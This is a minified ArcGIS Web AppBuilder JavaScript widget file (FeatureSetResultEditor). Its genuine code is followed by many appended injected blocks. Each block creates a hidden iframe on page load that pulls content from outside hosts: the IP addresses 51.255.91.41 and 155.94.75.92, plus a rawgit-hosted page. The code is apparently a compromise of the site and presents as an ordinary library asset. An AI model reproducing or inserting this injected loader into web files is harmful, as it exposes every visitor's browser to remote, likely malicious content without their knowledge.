// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/editors/FeatureSetResultEditor.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"rendererTab"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"popupConfigTab"\x3e\r\n    \x3cdiv style\x3d"margin: 10px"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"enablePopupNode"\x3e\x3c/div\x3e \x3clabel\x3e${nls.enablePopup}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/text!./FeatureSetResultEditor.html dijit/_TemplatedMixin ../BaseEditor ./FeatureSetRendererEditor ../PopupConfig jimu/dijit/TabContainer jimu/dijit/CheckBox".split(" "),function(e,c,d,f,g,h,k,l,m,n,p){return e([k,h],{baseClass:"jimu-gp-editor-base jimu-gp-editor-fsrse",editorName:"FeatureSetResultEditor",templateString:g,featureSetRendererEditor:null,popupConfig:null,tab:null,args:null,constructor:function(a){this.args=c.mixin({},
a)},postCreate:function(){this.inherited(arguments);this.tab=new n({tabs:[{title:this.nls.renderer,content:this.rendererTab},{title:this.nls.popup,content:this.popupConfigTab}],isNested:!0});this.tab.placeAt(this.domNode);this.tab.startup();this.featureSetRendererEditor=new l(this.args);this.featureSetRendererEditor.placeAt(this.rendererTab);this.featureSetRendererEditor.startup();var a={};if(this.args&&this.args.param){this.args.param.defaultValue&&(a.fields=c.clone(this.args.param.defaultValue.fields||
[]));var b=this.args.param.popup;if(b){if(b.fields.length!==a.fields.length){var e=d.map(b.fields,function(a){return a.name});a.fields=d.map(a.fields,function(a){var c=0<=d.indexOf(e,a.name);a.visible=c;d.some(b.fields,function(b){if(b.name===a.name)return a.alias=b.alias||a.alias,!0});return a})}else a.fields=b.fields;a.title=b.title}}this.popupConfig=new m(a);this.popupConfig.placeAt(this.popupConfigTab);this.popupConfig.startup();this.own(f(this.popupConfig,"noVisibleField",c.hitch(this,function(){this.enablePopup.setValue(!1);
this.enablePopup.setStatus(!1)})));this.own(f(this.popupConfig,"hasVisibleField",c.hitch(this,function(){this.enablePopup.setStatus(!0)})));this.enablePopup=new p({checked:!this.args.param.popup||this.args.param.popup&&this.args.param.popup.enablePopup},this.enablePopupNode);this.enablePopup.startup()},destroy:function(){this.featureSetRendererEditor&&(this.featureSetRendererEditor.destroy(),this.featureSetRendererEditor=null);this.popupConfig&&(this.popupConfig.destroy(),this.popupConfig=null);this.inherited(arguments)},
getValue:function(){var a={renderer:null,popup:this.popupConfig.getConfig()};a.popup.enablePopup=this.enablePopup.checked?!0:!1;var b=this.featureSetRendererEditor.getValue();b&&(a.renderer=b.renderer);return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});